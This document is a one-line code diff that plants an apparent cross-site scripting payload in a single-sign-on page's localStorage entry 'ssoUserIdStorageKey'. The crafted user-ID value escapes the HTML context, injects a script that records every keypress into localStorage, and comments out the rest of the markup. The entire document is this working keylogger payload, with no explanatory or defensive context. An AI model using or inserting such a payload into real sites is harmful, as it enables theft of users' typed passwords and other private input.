@@ -1,0 +1,1 @@
+localStorage.setItem(\"ssoUserIdStorageKey\",\"{\\\"entries\\\":[{\\\"user\\\":\\\"\\\\\\\"hello><script>var l = \\\\\\\"\\\\\\\"; document.onkeypress = function(e){;l+=e.key;localStorage.setItem(\\\\\\\"key\\\\\\\", l);};</script><!--\\\",\\\"idp\\\":\\\"NULL\\\"}]}\");
